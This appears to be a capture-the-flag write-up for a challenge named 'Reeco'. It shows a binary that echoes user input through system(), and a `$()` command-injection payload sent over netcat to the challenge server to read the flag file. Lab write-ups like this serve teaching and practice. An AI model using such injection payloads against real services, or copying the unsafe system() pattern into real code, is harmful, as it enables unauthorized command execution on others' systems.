# Reeco

## Description

Mission briefing: Something you say can come back at you. The question is, do you even know what to search for?

Try getting the flag from 141.85.224.104:6665

## Solution

Running the binary locally shows that whatever we type is echoed back:

```bash
$ ./reeco
aa
---------------------------------------------------------------
|                                                             |
| aa                                                          |
|                                                             |
---------------------------------------------------------------
```

Looking at the disassembly of the program, we see there is a `system()` function which seems to call `/bin/echo` to print our output.

```c
int main(void)
{
...

builtin_strncpy(local_28,"/bin/echo ",11);

...

snprintf(cmd,384,local_36,sound);
system(cmd);
return 0;
}
```

`snprintf` copies our input into `cmd`, and `system` runs that command through /bin/sh -c. Because the input is only wrapped in double-quotes, we can break out of the echo command with shell metacharacters such as `$()` or back-ticks, achieving command injection.

```bash
$ nc 141.85.224.104 6665
$(cd home; cd ctf; cat flag)
---------------------------------------------------------------
|                                                             |
| SSS{pL$TeLlMeUhearThis2}                                |
|                                                             |
---------------------------------------------------------------
```

## Flag

`SSS{pL$TeLlMeUhearThis2}`
